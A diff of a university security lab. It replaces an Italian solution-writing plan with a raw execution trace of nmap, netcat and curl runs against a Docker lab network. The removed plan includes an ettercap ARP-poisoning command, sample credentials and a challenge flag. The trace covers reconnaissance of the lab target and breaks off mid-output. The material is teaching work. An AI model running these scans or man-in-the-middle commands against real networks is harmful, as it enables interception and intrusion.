@@ -1,127 +1,3180 @@
-Dall'analisi dettagliata del file di log di esecuzione reale ([`lab01_execution_output.txt`](file:///Users/nicolabeccaceci/Desktop/SICUREZZA%20DEI%20SISTEMI%20INFORMATIVI/LABS/lab01/solution/logs/lab01_execution_output.txt)), emerge chiaramente come deve essere strutturato il flusso di lavoro per ciascun esercizio e come deve essere costruita la soluzione didattica nel documento finale.
+LAB 01 RAW EXECUTION TRACE
+Assignment: lab01.pdf, v1.4 (06/10/2026), A.A. 2026/27
+Environment: project labinf, Docker bridge 10.92.2.0/24
+Evidence is captured from container commands; timestamps use the host local timezone.
 
-La skill [**`lab-solution-generator`**](file:///Users/nicolabeccaceci/Desktop/SICUREZZA%20DEI%20SISTEMI%20INFORMATIVI/.agents/skills/lab-solution-generator/SKILL.md) è stata aggiornata per garantire che:
-1. **Tutti gli output reali delle shell** (di Alice, Bob e Chuck) vengano inseriti integralmente nei blocchi di codice LaTeX (`terminal listing`), senza omissioni o riassunti sintetici.
-2. Ciascun output venga decostruito ed esaminato sia a livello di singolo campo/banner, sia nella prospettiva a lungo termine della sicurezza informatica (attacco, difesa, protocolli RFC, firme di rilevamento).
-3. Al termine della compilazione, venga mantenuto unicamente il file finale `lab01_solution.pdf` accanto al testo originale del professore (`01lab_AttacchidiBase.pdf` o `Laboratorio 01.pdf`).
+====================================================================================================
+[Environment identity]
+Node: host
+Started: 2026-10-12T08:07:48+02:00
+Ended: 2026-10-12T08:07:48+02:00
+Command: ['docker', 'inspect', '-f', '{{.Name}} {{range .NetworkSettings.Networks}}{{.IPAddress}} {{.MacAddress}}{{end}}', 'labinf-alice-1', 'labinf-bob-1', 'labinf-chuck-1']
+Exit status: 0
+--- stdout ---
+/labinf-alice-1 10.92.2.10 ee:44:2a:81:b5:6e
+/labinf-bob-1 10.92.2.20 86:e8:5f:bf:03:b0
+/labinf-chuck-1 10.92.2.30 76:0b:00:c9:38:f5
+--- stderr ---
+(empty)
 
----
+====================================================================================================
+[Tool versions]
+Node: bob
+Started: 2026-10-12T08:07:48+02:00
+Ended: 2026-10-12T08:07:48+02:00
+Command: nmap --version | head -3; ftp -? 2>&1 | head -3; s-nail --version | head -2
+Exit status: 0
+--- stdout ---
+Nmap version 7.99 ( https://nmap.org )
+Platform: aarch64-unknown-linux-gnu
+Compiled with: liblua-5.4.8 openssl-3.6.4 libssh2-1.11.1 libz-1.3.1 libpcre2-10.48 libpcap-1.10.7 nmap-libdnet-1.18.0 ipv6
+usage: ftp [-46AadefginpRtVv] [-b BUFSIZE] [-H HEADER] [-N NETRC] [-o OUTPUT]
+           [-P PORT] [-q QUITTIME] [-r RETRY] [-s SRCADDR] [-T DIR,MAX[,INC]]
+           [-x XFERSIZE]
+s-nail v14.9.25, 2024-06-27 (built for Linux)
+--- stderr ---
+(empty)
 
-### Piano Operativo di Redazione della Soluzione (Laboratorio 01)
+====================================================================================================
+[Alice listeners]
+Node: alice
+Started: 2026-10-12T08:07:48+02:00
+Ended: 2026-10-12T08:07:49+02:00
+Command: netstat -ltup
+Exit status: 0
+--- stdout ---
+Active Internet connections (only servers)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
+tcp        0      0 0.0.0.0:ftp             0.0.0.0:*               LISTEN      14/python3          
+tcp        0      0 0.0.0.0:ssh             0.0.0.0:*               LISTEN      15/sshd: /usr/sbin/ 
+tcp        0      0 0.0.0.0:smtp            0.0.0.0:*               LISTEN      -                   
+tcp        0      0 0.0.0.0:http            0.0.0.0:*               LISTEN      10/httpd            
+tcp        0      0 127.0.0.11:41749        0.0.0.0:*               LISTEN      -                   
+tcp        0      0 0.0.0.0:1337            0.0.0.0:*               LISTEN      11/python3          
+tcp        0      0 0.0.0.0:iprop           0.0.0.0:*               LISTEN      14/python3          
+tcp6       0      0 [::]:ssh                [::]:*                  LISTEN      15/sshd: /usr/sbin/ 
+tcp6       0      0 [::]:smtp               [::]:*                  LISTEN      -                   
+udp        0      0 127.0.0.11:57237        0.0.0.0:*                           -                   
+--- stderr ---
+(empty)
 
-Sulla base dei dati reali registrati nei log, ecco come il documento di soluzione approfondirà ogni singolo esercizio:
+====================================================================================================
+[Exercise 1: TCP scan and OS detection]
+Node: bob
+Started: 2026-10-12T08:07:49+02:00
+Ended: 2026-10-12T08:07:50+02:00
+Command: nmap -sT -p 80 -O -v 10.92.2.10
+Exit status: 0
+--- stdout ---
+Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-12 06:07 +0000
+Initiating ARP Ping Scan at 06:07
+Scanning 10.92.2.10 [1 port]
+Completed ARP Ping Scan at 06:07, 0.06s elapsed (1 total hosts)
+Initiating Parallel DNS resolution of 1 host. at 06:07
+Completed Parallel DNS resolution of 1 host. at 06:07, 0.00s elapsed
+Initiating Connect Scan at 06:07
+Scanning labinf-alice-1.labinf_secnet (10.92.2.10) [1 port]
+Discovered open port 80/tcp on 10.92.2.10
+Completed Connect Scan at 06:07, 0.00s elapsed (1 total ports)
+Initiating OS detection (try #1) against labinf-alice-1.labinf_secnet (10.92.2.10)
+Nmap scan report for labinf-alice-1.labinf_secnet (10.92.2.10)
+Host is up (0.00015s latency).
 
-#### 1. Obiettivo Generale e Architettura di Rete
-* **Scenario**: Sottorete `10.0.2.0/24` con gateway `10.0.2.1`.
-* **I Ruoli**:
-  * **Alice** (`10.0.2.10`, MAC `3a:fa:2d:da:b8:37`): Server target che ospita Apache (`80/tcp`), Exim4 (`25/tcp`), Mock FTP (`2121/tcp`) e un servizio secret/challenge (`1337/tcp`).
-  * **Bob** (`10.0.2.20`, MAC `86:e9:c4:e4:c0:69`): Client legittimo.
-  * **Chuck** (`10.0.2.30`, MAC `be:98:f3:bc:e3:32`): Host attaccante (Kali Linux) che esegue ricognizione, ARP poisoning e packet sniffing.
-* **Obiettivo a Lungo Termine**: Dimostrare le vulnerabilità intrinseche del livello 2 (ARP stateless e non autenticato) e del livello applicativo in chiaro (HTTP, SMTP senza STARTTLS, FTP), mostrando come un attaccante adiacente (stesso dominio di broadcast) possa elevare i propri privilegi a livello di rete per intercettare comunicazioni e credenziali riservate.
+PORT   STATE SERVICE
+80/tcp open  http
+MAC Address: EE:44:2A:81:B5:6E (Unknown)
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: general purpose|router
+Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
+OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
+Uptime guess: 43.090 days (since Sun Aug 30 03:58:43 2026)
+Network Distance: 1 hop
+TCP Sequence Prediction: Difficulty=263 (Good luck!)
+IP ID Sequence Generation: All zeros
 
----
+Read data files from: /usr/share/nmap
+OS detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 1.48 seconds
+           Raw packets sent: 23 (1.806KB) | Rcvd: 15 (1.278KB)
+--- stderr ---
+(empty)
 
-#### 2. Esercizio 1: Network Scanning & OS Fingerprinting
-* **Comandi Eseguiti**:
-  1. `nmap -sn 10.0.2.0/24`: Ping sweep / ARP scan su layer 2 per identificare i 4 host attivi (Chuck scopre Gateway, Alice e Bob).
-  2. `sudo nmap -O -Pn 10.0.2.10`: Fingerprinting dello stack TCP/IP per dedurre la famiglia del sistema operativo (Linux kernel 4.x/5.x).
-* **Output Shell Reale Integrato**: Visualizzazione dell'output Nmap completo con latenze, indirizzi MAC e fingerprinting CPE.
-* **Spiegazione dei Parametri e Meccanismi**:
-  * `-sn`: Disabilita il port scanning focalizzandosi solo sull'host discovery. In rete locale invia richieste ARP broadcast (estremamente veloci e non bloccabili da firewall host IP).
-  * `-O`: Invia pacchetti TCP SYN, NULL, FIN e probe UDP con combinazioni insolite di flag, analizzando le differenze nell'ISN (Initial Sequence Number), nelle opzioni TCP (MSS, Window Scale, SACK) e nel campo IP ID.
-  * `-Pn`: Salta la verifica ICMP ping (assume l'host attivo), fondamentale contro host che filtrano Echo Request.
-* **Prospettiva a Lungo Termine & Difesa**:
-  * Fase iniziale della Kill Chain (Reconnaissance).
-  * **Difesa**: Restrizioni sull'isolamento di porta (Private VLAN), mascheramento TCP/IP fingerprinting tramite kernel tuning (`tcp_timestamps`, IP ID randomizzati).
+====================================================================================================
+[Exercise 2: first 1024 TCP ports]
+Node: bob
+Started: 2026-10-12T08:07:50+02:00
+Ended: 2026-10-12T08:07:50+02:00
+Command: nmap -sT -Pn -p 1-1024 -v 10.92.2.10
+Exit status: 0
+--- stdout ---
+Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-12 06:07 +0000
+Initiating Parallel DNS resolution of 1 host. at 06:07
+Completed Parallel DNS resolution of 1 host. at 06:07, 0.00s elapsed
+Initiating Connect Scan at 06:07
+Scanning labinf-alice-1.labinf_secnet (10.92.2.10) [1024 ports]
+Discovered open port 25/tcp on 10.92.2.10
+Discovered open port 21/tcp on 10.92.2.10
+Discovered open port 22/tcp on 10.92.2.10
+Discovered open port 80/tcp on 10.92.2.10
+Completed Connect Scan at 06:07, 0.01s elapsed (1024 total ports)
+Nmap scan report for labinf-alice-1.labinf_secnet (10.92.2.10)
+Host is up (0.000053s latency).
+Not shown: 1020 closed tcp ports (conn-refused)
+PORT   STATE SERVICE
+21/tcp open  ftp
+22/tcp open  ssh
+25/tcp open  smtp
+80/tcp open  http
 
----
+Read data files from: /usr/share/nmap
+Nmap done: 1 IP address (1 host up) scanned in 0.03 seconds
+--- stderr ---
+(empty)
 
-#### 3. Esercizio 2: Port Scanning su Alice
-* **Comandi Eseguiti**:
-  1. `netstat -tuln` (su Alice): Ispezione dello stato locale dei socket in ascolto (`0.0.0.0:25`, `0.0.0.0:80`, `0.0.0.0:1337`, `0.0.0.0:2121`).
-  2. `nmap -sT -p 1-1024 10.0.2.10` (su Chuck): TCP Connect Scan (3-way handshake completo).
-  3. `sudo nmap -sS -p 1-1024 10.0.2.10` (su Chuck): SYN Stealth Scan (half-open).
-  4. `nmap -p- 10.0.2.10` (su Chuck): Scansione esaustiva di tutte le 65535 porte TCP.
-* **Output Shell Reale Integrato**: Confronto puntuale tra i socket attivi di Alice e le risposte rilevate da Nmap (porte 25 e 80 nel range 1–1024, e scoperta delle porte 1337 e 2121 con `-p-`).
-* **Analisi Tecnica e Differenze**:
-  * `-sT` vs `-sS`: `-sT` effettua `connect()` a livello di sistema operativo; l'applicazione bersaglio riceve la connessione e la registra nei file di log applicativi (es. log di Apache). `-sS` richiede privilegi di root (raw sockets) e invia un `RST` appena riceve il `SYN-ACK`, interrompendo la connessione prima che venga completata, evitando il log a livello applicativo.
-  * Importanza di `-p-`: Le porte non standard (2121 e 1337) sfuggono alle scansioni di default (che controllano solo le prime 1000 porte più comuni), dimostrando il fallimento del concetto di "Security through Obscurity".
+====================================================================================================
+[Exercise 3: FTP client on default port]
+Node: bob
+Started: 2026-10-12T08:07:50+02:00
+Ended: 2026-10-12T08:07:55+02:00
+Command: timeout 8 ftp -inv 10.92.2.10
+Exit status: 0
+--- stdout ---
+Connected to 10.92.2.10.
+Enter your username: 421 Service not available, remote server has closed connection.
+?Invalid command.
+?Invalid command.
+?Invalid command.
+--- stderr ---
+(empty)
 
----
+====================================================================================================
+[Exercise 3: raw netcat connection on default port]
+Node: bob
+Started: 2026-10-12T08:07:55+02:00
+Ended: 2026-10-12T08:08:00+02:00
+Command: timeout 8 nc -v -w 5 10.92.2.10 21
+Exit status: 0
+--- stdout ---
+Enter your username: Enter your password: 
+--- stderr ---
+Connection to 10.92.2.10 21 port [tcp/ftp] succeeded!
 
-#### 4. Esercizio 3 & 4: Banner Grabbing, Mock FTP e Identificazione Servizi
-* **Comandi Eseguiti**:
-  1. `echo HELP | nc -v -w 3 10.0.2.10 2121`: Connessione interattiva raw su porta 2121 con Netcat.
-  2. `nmap -sV -Pn -p 25,80,1337,2121 -v 10.0.2.10`: Service version probe e script engine (NSE).
-* **Output Shell Reale Integrato**:
-  * Banner FTP simulato: `Enter your username: Enter your password:`.
-  * Versioni individuate da Nmap: `Apache httpd 2.4.69`, `Exim smtpd 4.98.2`.
-  * Generazione dei Service Fingerprint Nmap per i servizi non standard sulle porte 1337 e 2121.
-* **Significato di Sicurezza**:
-  * Il banner grabbing permette all'attaccante di verificare la presenza di CVE note per quella specifica versione (es. Exim 4.98.2 o Apache 2.4.69).
-  * Dimostra perché i server in produzione devono mascherare le stringhe di versione (`ServerSignature Off`, `ServerTokens Prod` in Apache, `smtp_banner` personalizzato in Exim).
+====================================================================================================
+[Exercise 4: service version detection]
+Node: bob
+Started: 2026-10-12T08:08:00+02:00
+Ended: 2026-10-12T08:10:32+02:00
+Command: nmap -sV -Pn -p 1-1024 -v 10.92.2.10
+Exit status: 0
+--- stdout ---
+Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-12 06:08 +0000
+NSE: Loaded 48 scripts for scanning.
+Initiating ARP Ping Scan at 06:08
+Scanning 10.92.2.10 [1 port]
+Completed ARP Ping Scan at 06:08, 0.03s elapsed (1 total hosts)
+Initiating Parallel DNS resolution of 1 host. at 06:08
+Completed Parallel DNS resolution of 1 host. at 06:08, 0.00s elapsed
+Initiating SYN Stealth Scan at 06:08
+Scanning labinf-alice-1.labinf_secnet (10.92.2.10) [1024 ports]
+Discovered open port 25/tcp on 10.92.2.10
+Discovered open port 80/tcp on 10.92.2.10
+Discovered open port 22/tcp on 10.92.2.10
+Discovered open port 21/tcp on 10.92.2.10
+Completed SYN Stealth Scan at 06:08, 0.02s elapsed (1024 total ports)
+Initiating Service scan at 06:08
+Scanning 4 services on labinf-alice-1.labinf_secnet (10.92.2.10)
+Completed Service scan at 06:10, 150.25s elapsed (4 services on 1 host)
+NSE: Script scanning 10.92.2.10.
+Initiating NSE at 06:10
+Completed NSE at 06:10, 0.03s elapsed
+Initiating NSE at 06:10
+Completed NSE at 06:10, 1.01s elapsed
+Nmap scan report for labinf-alice-1.labinf_secnet (10.92.2.10)
+Host is up (0.0000040s latency).
+Not shown: 1020 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp?
+22/tcp open  ssh     OpenSSH 10.0p2 Debian 7+deb13u4 (protocol 2.0)
+25/tcp open  smtp    Exim smtpd 4.98.2
+80/tcp open  http    Apache httpd 2.4.69 ((Unix))
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port21-TCP:V=7.99%I=7%D=10/12%Time=6ACC7946%P=aarch64-unknown-linux-gnu
+SF:%r(NULL,15,"Enter\x20your\x20username:\x20")%r(GenericLines,2A,"Enter\x
+SF:20your\x20username:\x20Enter\x20your\x20password:\x20")%r(Help,2A,"Ente
+SF:r\x20your\x20username:\x20Enter\x20your\x20password:\x20")%r(GetRequest
+SF:,2A,"Enter\x20your\x20username:\x20Enter\x20your\x20password:\x20")%r(H
+SF:TTPOptions,2A,"Enter\x20your\x20username:\x20Enter\x20your\x20password:
+SF:\x20")%r(RTSPRequest,2A,"Enter\x20your\x20username:\x20Enter\x20your\x2
+SF:0password:\x20")%r(RPCCheck,2A,"Enter\x20your\x20username:\x20Enter\x20
+SF:your\x20password:\x20")%r(DNSVersionBindReqTCP,2A,"Enter\x20your\x20use
+SF:rname:\x20Enter\x20your\x20password:\x20")%r(DNSStatusRequestTCP,2A,"En
+SF:ter\x20your\x20username:\x20Enter\x20your\x20password:\x20")%r(SSLSessi
+SF:onReq,2A,"Enter\x20your\x20username:\x20Enter\x20your\x20password:\x20"
+SF:)%r(TerminalServerCookie,2A,"Enter\x20your\x20username:\x20Enter\x20you
+SF:r\x20password:\x20")%r(TLSSessionReq,2A,"Enter\x20your\x20username:\x20
+SF:Enter\x20your\x20password:\x20")%r(Kerberos,2A,"Enter\x20your\x20userna
+SF:me:\x20Enter\x20your\x20password:\x20")%r(SMBProgNeg,2A,"Enter\x20your\
+SF:x20username:\x20Enter\x20your\x20password:\x20")%r(X11Probe,2A,"Enter\x
+SF:20your\x20username:\x20Enter\x20your\x20password:\x20")%r(FourOhFourReq
+SF:uest,2A,"Enter\x20your\x20username:\x20Enter\x20your\x20password:\x20")
+SF:%r(LPDString,2A,"Enter\x20your\x20username:\x20Enter\x20your\x20passwor
+SF:d:\x20")%r(LDAPSearchReq,2A,"Enter\x20your\x20username:\x20Enter\x20you
+SF:r\x20password:\x20")%r(LDAPBindReq,2A,"Enter\x20your\x20username:\x20En
+SF:ter\x20your\x20password:\x20")%r(SIPOptions,2A,"Enter\x20your\x20userna
+SF:me:\x20Enter\x20your\x20password:\x20")%r(LANDesk-RC,2A,"Enter\x20your\
+SF:x20username:\x20Enter\x20your\x20password:\x20")%r(TerminalServer,2A,"E
+SF:nter\x20your\x20username:\x20Enter\x20your\x20password:\x20")%r(NCP,2A,
+SF:"Enter\x20your\x20username:\x20Enter\x20your\x20password:\x20")%r(Notes
+SF:RPC,2A,"Enter\x20your\x20username:\x20Enter\x20your\x20password:\x20")%
+SF:r(JavaRMI,2A,"Enter\x20your\x20username:\x20Enter\x20your\x20password:\
+SF:x20")%r(WMSRequest,2A,"Enter\x20your\x20username:\x20Enter\x20your\x20p
+SF:assword:\x20");
+MAC Address: EE:44:2A:81:B5:6E (Unknown)
+Service Info: Host: f6a4bf9843d1; OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
----
+Read data files from: /usr/share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 151.57 seconds
+           Raw packets sent: 1025 (45.084KB) | Rcvd: 1025 (41.004KB)
+--- stderr ---
+(empty)
 
-#### 5. Esercizio 4.1: Interazione Challenge Porta 1337
-* **Comando Eseguito**: `nc 10.0.2.10 1337` (premendo Invio).
-* **Output Shell Reale Integrato**: Disegno ASCII art del "Super Secret Cat v2.4.67" e cattura della flag:
-  `SSI{p0rt_scann3r5_4r3_4w3s0m3}`.
-* **Lezione Operativa**: Validazione del principio che qualsiasi servizio aperto sulla rete è una potenziale superficie d'attacco o backdoor lasciata per debug.
+====================================================================================================
+[Exercise 4: aggressive scan]
+Node: bob
+Started: 2026-10-12T08:10:32+02:00
+Ended: 2026-10-12T08:13:46+02:00
+Command: nmap -A -Pn -p 1-1024 -v 10.92.2.10
+Exit status: 0
+--- stdout ---
+Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-12 06:10 +0000
+NSE: Loaded 158 scripts for scanning.
+NSE: Script Pre-scanning.
+Initiating NSE at 06:10
+Completed NSE at 06:10, 0.00s elapsed
+Initiating NSE at 06:10
+Completed NSE at 06:10, 0.00s elapsed
+Initiating NSE at 06:10
+Completed NSE at 06:10, 0.00s elapsed
+Initiating ARP Ping Scan at 06:10
+Scanning 10.92.2.10 [1 port]
+Completed ARP Ping Scan at 06:10, 0.04s elapsed (1 total hosts)
+Initiating Parallel DNS resolution of 1 host. at 06:10
+Completed Parallel DNS resolution of 1 host. at 06:10, 0.00s elapsed
+Initiating SYN Stealth Scan at 06:10
+Scanning labinf-alice-1.labinf_secnet (10.92.2.10) [1024 ports]
+Discovered open port 22/tcp on 10.92.2.10
+Discovered open port 21/tcp on 10.92.2.10
+Discovered open port 80/tcp on 10.92.2.10
+Discovered open port 25/tcp on 10.92.2.10
+Completed SYN Stealth Scan at 06:10, 0.03s elapsed (1024 total ports)
+Initiating Service scan at 06:10
+Scanning 4 services on labinf-alice-1.labinf_secnet (10.92.2.10)
+Completed Service scan at 06:13, 150.29s elapsed (4 services on 1 host)
+Initiating OS detection (try #1) against labinf-alice-1.labinf_secnet (10.92.2.10)
+NSE: Script scanning 10.92.2.10.
+Initiating NSE at 06:13
+Completed NSE at 06:13, 15.07s elapsed
+Initiating NSE at 06:13
+Completed NSE at 06:13, 26.21s elapsed
+Initiating NSE at 06:13
+Completed NSE at 06:13, 0.00s elapsed
+Nmap scan report for labinf-alice-1.labinf_secnet (10.92.2.10)
+Host is up (0.00014s latency).
+Not shown: 1020 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp?
+|_ftp-bounce: ERROR: Script execution failed (use -d to debug)
+| fingerprint-strings: 
+|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NCP, NotesRPC, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, X11Probe: 
+|     Enter your username: Enter your password:
+|   NULL: 
+|_    Enter your username:
+22/tcp open  ssh     OpenSSH 10.0p2 Debian 7+deb13u4 (protocol 2.0)
+25/tcp open  smtp    Exim smtpd 4.98.2
+|_smtp-commands: SMTP: EHLO 501 Syntactically invalid EHLO argument(s)\x0D
+80/tcp open  http    Apache httpd 2.4.69 ((Unix))
+|_http-title: My Beautiful Page
+|_http-server-header: Apache/2.4.69 (Unix)
+| http-methods: 
+|   Supported Methods: GET POST OPTIONS HEAD TRACE
+|_  Potentially risky methods: TRACE
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port21-TCP:V=7.99%I=7%D=10/12%Time=6ACC79DE%P=aarch64-unknown-linux-gnu
+SF:%r(NULL,15,"Enter\x20your\x20username:\x20")%r(GenericLines,2A,"Enter\x
+SF:20your\x20username:\x20Enter\x20your\x20password:\x20")%r(Help,2A,"Ente
+SF:r\x20your\x20username:\x20Enter\x20your\x20password:\x20")%r(GetRequest
+SF:,2A,"Enter\x20your\x20username:\x20Enter\x20your\x20password:\x20")%r(H
+SF:TTPOptions,2A,"Enter\x20your\x20username:\x20Enter\x20your\x20password:
+SF:\x20")%r(RTSPRequest,2A,"Enter\x20your\x20username:\x20Enter\x20your\x2
+SF:0password:\x20")%r(RPCCheck,2A,"Enter\x20your\x20username:\x20Enter\x20
+SF:your\x20password:\x20")%r(DNSVersionBindReqTCP,2A,"Enter\x20your\x20use
+SF:rname:\x20Enter\x20your\x20password:\x20")%r(DNSStatusRequestTCP,2A,"En
+SF:ter\x20your\x20username:\x20Enter\x20your\x20password:\x20")%r(SSLSessi
+SF:onReq,2A,"Enter\x20your\x20username:\x20Enter\x20your\x20password:\x20"
+SF:)%r(TerminalServerCookie,2A,"Enter\x20your\x20username:\x20Enter\x20you
+SF:r\x20password:\x20")%r(TLSSessionReq,2A,"Enter\x20your\x20username:\x20
+SF:Enter\x20your\x20password:\x20")%r(Kerberos,2A,"Enter\x20your\x20userna
+SF:me:\x20Enter\x20your\x20password:\x20")%r(SMBProgNeg,2A,"Enter\x20your\
+SF:x20username:\x20Enter\x20your\x20password:\x20")%r(X11Probe,2A,"Enter\x
+SF:20your\x20username:\x20Enter\x20your\x20password:\x20")%r(FourOhFourReq
+SF:uest,2A,"Enter\x20your\x20username:\x20Enter\x20your\x20password:\x20")
+SF:%r(LPDString,2A,"Enter\x20your\x20username:\x20Enter\x20your\x20passwor
+SF:d:\x20")%r(LDAPSearchReq,2A,"Enter\x20your\x20username:\x20Enter\x20you
+SF:r\x20password:\x20")%r(LDAPBindReq,2A,"Enter\x20your\x20username:\x20En
+SF:ter\x20your\x20password:\x20")%r(SIPOptions,2A,"Enter\x20your\x20userna
+SF:me:\x20Enter\x20your\x20password:\x20")%r(LANDesk-RC,2A,"Enter\x20your\
+SF:x20username:\x20Enter\x20your\x20password:\x20")%r(TerminalServer,2A,"E
+SF:nter\x20your\x20username:\x20Enter\x20your\x20password:\x20")%r(NCP,2A,
+SF:"Enter\x20your\x20username:\x20Enter\x20your\x20password:\x20")%r(Notes
+SF:RPC,2A,"Enter\x20your\x20username:\x20Enter\x20your\x20password:\x20")%
+SF:r(JavaRMI,2A,"Enter\x20your\x20username:\x20Enter\x20your\x20password:\
+SF:x20")%r(WMSRequest,2A,"Enter\x20your\x20username:\x20Enter\x20your\x20p
+SF:assword:\x20");
+MAC Address: EE:44:2A:81:B5:6E (Unknown)
+Device type: general purpose|router
+Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
+OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
+Uptime guess: 43.094 days (since Sun Aug 30 03:58:43 2026)
+Network Distance: 1 hop
+TCP Sequence Prediction: Difficulty=259 (Good luck!)
+IP ID Sequence Generation: All zeros
+Service Info: Host: f6a4bf9843d1; OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
----
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.14 ms labinf-alice-1.labinf_secnet (10.92.2.10)
 
-#### 6. Esercizio 5: Man-In-The-Middle (ARP Cache Poisoning con Ettercap)
-* **Comandi Eseguiti**:
-  1. `arp -e` (prima dell'attacco su Bob, Alice e Chuck per mappare i MAC address corretti).
-  2. `sudo ettercap -T -q -M arp:remote /10.0.2.10// /10.0.2.20//` (avvio dell'avvelenamento bidirezionale).
-  3. `arp -e` (ispezione post-attacco su Bob e Alice).
-* **Output Shell Reale Integrato**: Tabella ARP iniziale vs tabella ARP avvelenata.
-  * Il MAC di Chuck (`be:98:f3:bc:e3:32`) viene associato alle voci ARP di Alice e Bob.
-* **Analisi dei Meccanismi**:
-  * Spiegazione dell'assenza di autenticazione in ARP (RFC 826). L'accettazione passiva di *Gratuitous ARP Reply* permette a Chuck di sovrascrivere la cache degli host adiacenti.
-  * Ruolo del flag `arp:remote` e dell'abilitazione automatica di `ip_forward=1` da parte di Ettercap per agire come gateway trasparente senza generare Denial of Service.
-* **Contromisure Aziendali**:
-  * Switch enterprise: **Dynamic ARP Inspection (DAI)** combinato con **DHCP Snooping**.
-  * Tabelle ARP statiche (`arp -s`).
-  * Sistemi di rilevamento tipo `arpwatch` o intrusion detection (Suricata).
+NSE: Script Post-scanning.
+Initiating NSE at 06:13
+Completed NSE at 06:13, 0.00s elapsed
+Initiating NSE at 06:13
+Completed NSE at 06:13, 0.00s elapsed
+Initiating NSE at 06:13
+Completed NSE at 06:13, 0.00s elapsed
+Read data files from: /usr/share/nmap
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 193.28 seconds
+           Raw packets sent: 1047 (46.862KB) | Rcvd: 1039 (42.254KB)
+--- stderr ---
+(empty)
 
----
+====================================================================================================
+[Challenge: HTTP landing page]
+Node: bob
+Started: 2026-10-12T08:13:46+02:00
+Ended: 2026-10-12T08:13:46+02:00
+Command: curl -sS -i http://10.92.2.10/index.html
+Exit status: 0
+--- stdout ---
+HTTP/1.1 200 OK
+Date: Mon, 12 Oct 2026 06:13:46 GMT
+Server: Apache/2.4.69 (Unix)
+Last-Modified: Fri, 09 Oct 2026 20:36:06 GMT
+ETag: "1c7-65d6e4c2bf980"
+Accept-Ranges: bytes
+Content-Length: 455
+Content-Type: text/html
 
-#### 7. Esercizio 6: Sniffing Traffico HTTP & Intercettazione Credenziali
-* **Comando Eseguito**:
-  `curl -X POST -d 'username=alice_student&password=SuperSecretPassword2026' http://10.0.2.10/login.html` (da Bob).
-* **Output Shell Reale Integrato**: Visualizzazione della pagina HTML di login restituita dal server e cattura del payload POST in chiaro.
-* **Analisi Tecnica & Rilevanza**:
-  * Trasmissione in chiaro dei dati utente nel corpo del pacchetto TCP (`application/x-www-form-urlencoded`).
-  * Perché il protocollo HTTP è inaccettabile per flussi di autenticazione.
-  * Soluzione a lungo termine: **HTTPS (TLS 1.3)** e adozione di **HSTS (HTTP Strict Transport Security)** per prevenire downgrade attack (SSL Stripping).
+<!DOCTYPE html>
+<html>
+<head>
+    <title>My Beautiful Page</title>
+</head>
+</head>
+<body>
+    <h1>This is the most incredible and astonishing HTML page you will encounter in your entire existence! Prepare to have your mind shattered in front of the brilliance and complexity of this masterpiece!</h1>
+    </br>
+    <p>Here is a picture of a cat that hides absolutely nothing:</p>
+    <a href="secret.html"><img src="cat.jpg" alt="Cat"></a>
+</body>
+</html>
+--- stderr ---
+(empty)
 
----
+====================================================================================================
+[Challenge: direct challenge service]
+Node: bob
+Started: 2026-10-12T08:13:46+02:00
+Ended: 2026-10-12T08:13:46+02:00
+Command: timeout 5 nc -w 3 10.92.2.10 1337
+Exit status: 0
+--- stdout ---
+Press enter to start this powerful program:                       /^--^\     /^--^\     /^--^\
+                      \____/     \____/     \____/
+                     /      \   /      \   /      \
+                    |        | |        | |        |
+                     \__  __/   \__  __/   \__  __/
+ ^|^|^|^|^|^|^|^|^|^|^|^|^|^|^|^|^|^|^|^|^|^|^|^|^|^|^|^|^|^|^|^|^|^|^|^|^|^|
+| | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | |
+########################/ /######\ \###########/ /#######################
+| | | | | | | | | | | | \/| | | | \/| | | | | | \/ | | | | | | | | | | | |
+|_|_|_|_|_|_|_|_|_|_|_|_|_|_|_|_|_|_|_|_|_|_|_|_|_|_|_|_|_|_|_|_|_|_|_|_|
 
-#### 8. Esercizio 7: Sniffing Traffico SMTP ed Esame Mailbox
-* **Comandi Eseguiti**:
-  1. Invio email SMTP su porta 25 da Bob ad Alice (`alice@localhost`).
-  2. `cat /var/mail/alice` su Alice per verificare la corretta ricezione e il contenuto.
-* **Output Shell Reale Integrato**: Traccia esatta del file mailbox `/var/mail/alice` con header completi:
